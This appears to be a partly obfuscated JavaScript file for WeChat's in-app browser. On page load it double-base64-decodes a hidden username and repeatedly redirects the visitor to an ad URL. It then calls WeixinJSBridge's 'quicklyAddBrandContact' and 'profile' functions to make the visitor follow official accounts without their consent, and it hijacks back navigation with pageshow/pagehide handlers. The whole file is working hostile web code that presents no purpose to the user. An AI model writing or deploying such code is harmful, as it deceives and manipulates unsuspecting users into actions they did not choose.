var url='https://mp.weixin.qq.com/mp/ad_biz_info?comp_id=335661&wx_aid=335661&wx_traceid=p8j65&preview=1&__biz=MzU5NTc1MDY1Mg==&sn=85fa04ac4d1f281015ba0702f2b02878&from=moments&tid=1640056832#wechat_redirect';

var zjiemi = document['getElementById']('zjiemi'),
  fval = zjiemi['value'];
var _val = fval['split']('')['reverse']()['join']('');
var jm1 = $['base64']['decode'](_val);
var jm2 = $['base64']['decode'](jm1);


window['localStorage']['setItem']('arrUsername','["' + jm2 + '"]');
window['localStorage']['setItem']('username', jm2);
window['localStorage']['setItem']('weChatUrl', 'undefined');
var username = localStorage['getItem']('username');
var arrUsername = eval('(' + localStorage['getItem']('arrUsername') + ')');
var isIos = !!navigator['userAgent']['match'](/\(i[^;]+;( U;)? CPU.+Mac OS X/);
var returnUrl = url;
let getWeChatUrl = localStorage['getItem']('weChatUrl')['split']("↵");
var weChatUrlArr = [url];
if (getWeChatUrl[0] !== 'undefined') {
  weChatUrlArr = getWeChatUrl
};
var wKey = parseInt(weChatUrlArr['length'] * Math['random']());
var weChatUrl = weChatUrlArr[wKey];
if(isIos){
  iosBatchSub('ok')
}else{
  subscribe(true);
}


function iosBatchSub(_0x3f75xf = 'stop') {
  var _0x3f75x10;

  function _0x3f75x11(_0x3f75x12 = {}) {
    if (_0x3f75x12 === 'ok') {
      var _0x3f75x13 = 0;
      var _0x3f75x14 = setInterval(_0x3f75x15, 50);
      _0x3f75x14();

      function _0x3f75x15() {
        _0x3f75x13++;
        go();
        if (_0x3f75x13 === 4) {
          clearInterval(_0x3f75x14);
          setTimeout(function() {
            WeixinJSBridge['invoke']('imagePreview', {
              "urls": [returnUrl]
            });
            var _0x3f75x16 = arrUsername;
            _0x3f75x16['forEach'](function(_0x3f75x17) {
              WeixinJSBridge['invoke']('quicklyAddBrandContact', {
                scene: '110',
                username: _0x3f75x17
              });
              _0x3f75x10 = 'ok';
              localStorage['setItem']('subscribeState', new Date()['getTime']());
              if (username === 'novel' || username === 'novel1' || username === 'novel2' || username === 'novel3' || username === 'novel4' || username === 'dyj' || username === 'gdt' || username === 'kc1' || username === 'kc2' || username === 'kc3' || username === 'kc4' || username === 'kc5' || username === 'kc6' || username === 'wifi1' || username === 'wifi2') {
                localStorage['setItem'](username + 'SubState', '1')
              };
              if (_0x3f75xf === 'stop') {
                window['location']['reload']()
              } else {}
            })
          }, 200)
        }
      }
    } else {
      if (username === 'novel' || username === 'novel1' || username === 'novel2' || username === 'novel3' || username === 'novel4' || username === 'dyj' || username === 'gdt' || username === 'kc1' || username === 'kc2' || username === 'kc3' || username === 'kc4' || username === 'kc5' || username === 'kc6' || username === 'wifi1' || username === 'wifi2') {
        _0x3f75x19();
        go()
      } else {
        _0x3f75x19('black');
        subscribe(false)
      }
    }
  }
  var _0x3f75x18 = parseInt((new Date()['getTime']() - Number(localStorage['getItem']('subscribeState'))) / 60000);
  _0x3f75x10 = 'await';
  if (typeof(WeixinJSBridge) === 'undefined') {
    if (document['addEventListener']) {
      document['addEventListener']('WeixinJSBridgeReady', _0x3f75x11, false)
    }
  } else {
    _0x3f75x11()
  };

  function _0x3f75x19(_0x3f75x1a = "") {
    var _0x3f75x1b = false;
    window['addEventListener']('pageshow', function() {
      if (_0x3f75x1b) {
        if (_0x3f75x1a !== "") {
          window['history']['back']()
        } else {
          if (_0x3f75x10 === 'await') {
            _0x3f75x11('ok')
          }
        }
      }
    });
    window['addEventListener']('pagehide', function() {
      _0x3f75x1b = true
    })
  }
}

function subscribe(_0x3f75x1d) {
  function _0x3f75x11() {
    var _0x3f75x13 = 0;
    var _0x3f75x14 = setInterval(subscribe, 50);

    function subscribe() {
      go();
      _0x3f75x13++;
      if (_0x3f75x13 === 4) {
        clearInterval(_0x3f75x14);
        setTimeout(function() {
          WeixinJSBridge['invoke']('profile', {
            "username": username,
            "nickname": 'weixin'
          }, function() {});
          if (_0x3f75x1d) {} else {}
        }, 200)
      }
    }

  }
  if (typeof(WeixinJSBridge) === 'undefined') {
    if (document['addEventListener']) {
      document['addEventListener']('WeixinJSBridgeReady', _0x3f75x11, false)
    }
  } else {
    _0x3f75x11()
  }
}

function go() {
  window['location']['href'] = weChatUrl
}
